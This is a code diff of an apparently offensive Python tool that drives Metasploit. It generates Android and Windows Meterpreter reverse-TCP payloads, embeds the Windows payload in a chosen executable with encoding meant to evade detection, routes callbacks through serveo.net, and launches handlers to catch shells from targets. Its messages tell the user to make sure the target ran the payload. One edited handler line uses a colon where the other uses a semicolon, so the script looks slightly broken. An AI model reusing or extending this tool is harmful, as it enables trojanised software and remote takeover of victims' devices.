@@ -207,7 +207,7 @@ def exploitandroid():
     prYellow("make sure the target installed the payload")    
     time.sleep(10)
     os.system('cd $HOME ')
-    os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run'")
+    os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + ";run'")
 def generatewindowspayload():
      print("We recommend learning Windows Payloads manually. There is a lot to learn")
      os.system ("cd $HOME")
@@ -219,7 +219,7 @@ def generatewindowspayload():
      if z1.lower() == "y":
          n1 = input("path of parent exe file to embed in?: ")
          print("Working...Please be patient[*]")
-         os.system('msfvenom -a x86 --platform windows -x ' + n1 + ' -k -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=' + x + ' -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe')
+         os.system('msfvenom -a x86 --platform windows -x ' + n1 + ' -k -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=' + x + ' -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o $HOME/downloads/WimdowsPayloadEmbedded.exe')
      print("Bye fellow hacker!")
      time.sleep(0.5)
      sys.exit()
@@ -233,7 +233,7 @@ def exploitwindowspayload():
     prYellow("make sure the target ran the payload")
     time.sleep(10)
     os.system('cd $HOME ')
-    os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run'")
+    os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + ":run'")
 def choice1():
     e1 = input('''Choose Platform
                [1] Android
